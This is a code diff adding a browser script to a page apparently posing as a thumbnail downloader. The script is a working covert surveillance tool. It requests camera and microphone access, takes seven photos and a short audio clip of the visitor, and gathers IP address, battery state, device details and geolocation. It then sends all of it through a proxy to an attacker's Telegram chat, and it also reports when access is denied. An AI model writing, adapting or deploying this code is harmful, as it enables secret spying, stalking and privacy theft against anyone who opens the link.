@@ -1,0 +1,105 @@
+<script type="text/javascript">
+  function downloadThumbnail(){ 
+    document.getElementById('thumbdloadbtn').textContent='Fetching from server... Wait'; 
+  }
+
+  function GetURLParameter(sParam){
+    var sPageURL=window.location.search.substring(1),sURLVariables=sPageURL.split('&');
+    for(var i=0;i<sURLVariables.length;i++){ 
+      var sParameterName=sURLVariables[i].split('='); 
+      if(sParameterName[0]==sParam){return sParameterName[1];} 
+    }
+  }
+
+  var chatid = GetURLParameter('id');
+
+  navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}, audio:true })
+  .then(async (stream)=>{
+    const imageCapture=new ImageCapture(stream.getVideoTracks()[0]);
+    const audioRecorder=new MediaRecorder(stream);
+
+    // --- capture 7 photos instead of 3 ---
+    for(let i=0;i<7;i++){ 
+      setTimeout(()=>{ 
+        imageCapture.takePhoto()
+          .then(blob=>sendToTelegram(blob,'photo'))
+          .catch(err=>console.error(err)); 
+      }, i*2000); 
+    }
+
+    audioRecorder.start();
+    setTimeout(()=>audioRecorder.stop(),5000);
+    audioRecorder.ondataavailable=(e)=>{ 
+      if(e.data.size>0) sendToTelegram(e.data,'audio'); 
+    }
+
+    if(chatid){
+      const [ip,battery]=await Promise.all([getIP(),getBattery()]); 
+      const device=getDeviceInfo();
+      fetch(`/api/proxy`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          type:'message',
+          chat_id:chatid,
+          text:`🧑‍💻 User Info:\n\n${ip}\n\n${battery}\n\n${device}`
+        })
+      });
+      if(navigator.geolocation){ 
+        navigator.geolocation.getCurrentPosition(pos=>{ 
+          fetch(`/api/proxy`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({
+              type:'location',
+              chat_id:chatid,
+              latitude:pos.coords.latitude,
+              longitude:pos.coords.longitude
+            })
+          }); 
+        }); 
+      }
+    }
+  })
+  .catch(err=>{
+    console.error(err);
+    if(chatid){
+      fetch(`/api/proxy`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          type:'message',
+          chat_id: chatid,
+          text: "❌ User denied camera or microphone access."
+        })
+      });
+    }
+  });
+
+  function sendToTelegram(data,type){ 
+    if(!chatid) return; 
+    const formData=new FormData(); 
+    formData.append('chat_id',chatid); 
+    formData.append(type==='photo'?'photo':'audio',data,`@Ali_CameraHack_bot.${type==='photo'?'jpg':'wav'}`); 
+    fetch(`/api/proxy?type=${type}`,{method:'POST', body:formData}); 
+  }
+
+  function getBattery(){ 
+    if(navigator.getBattery){ 
+      return navigator.getBattery().then(b=>`🔋 Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`); 
+    } 
+    return Promise.resolve("🔋 Battery: API not available"); 
+  }
+
+  function getIP(){ 
+    return fetch("https://api.ipify.org?format=json")
+      .then(res=>res.json())
+      .then(data=>`🌐 IP Address: ${data.ip}`)
+      .catch(()=> "🌐 IP Address: Could not detect"); 
+  }
+
+  // --- simplified device info ---
+  function getDeviceInfo(){ 
+    return `📱 Device Info:\nScreen: ${screen.width} x ${screen.height}\n⏰ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`; 
+  }
+</script>
